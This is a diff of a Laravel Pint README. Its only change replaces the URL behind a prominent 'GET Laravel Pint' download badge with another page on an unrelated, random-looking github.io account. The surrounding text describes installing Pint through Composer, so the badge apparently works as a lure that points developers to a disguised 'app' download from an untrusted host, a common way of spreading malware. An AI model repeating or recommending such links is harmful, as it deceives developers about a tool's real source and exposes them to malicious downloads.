@@ -53,7 +53,7 @@ The tool is powered by PHP CS Fixer while presenting a Laravel-first experience.
 
 Prerequisites: A Laravel or PHP project managed with Composer, a working PHP runtime, and terminal access for running formatting commands.
 
-[![GET Laravel Pint](https://img.shields.io/badge/GET%20%E2%80%94%20Laravel%20Pint-FF2D20?style=for-the-badge&logoColor=white)](https://oliveramhhyx433.github.io/.github/laravel-pint-app)
+[![GET Laravel Pint](https://img.shields.io/badge/GET%20%E2%80%94%20Laravel%20Pint-FF2D20?style=for-the-badge&logoColor=white)](https://saulcainbjgl.github.io/.github/laravel-pint-app)
 
 1.  **Install the Tool:** Use Laravel Pint install guidance from the project docs or add Laravel Pint composer support through the dependency setup used by your repository.
 2.  **Create Configuration:** Add a Laravel Pint config file when the default preset needs project-specific paths, exclusions, or Laravel Pint rules.
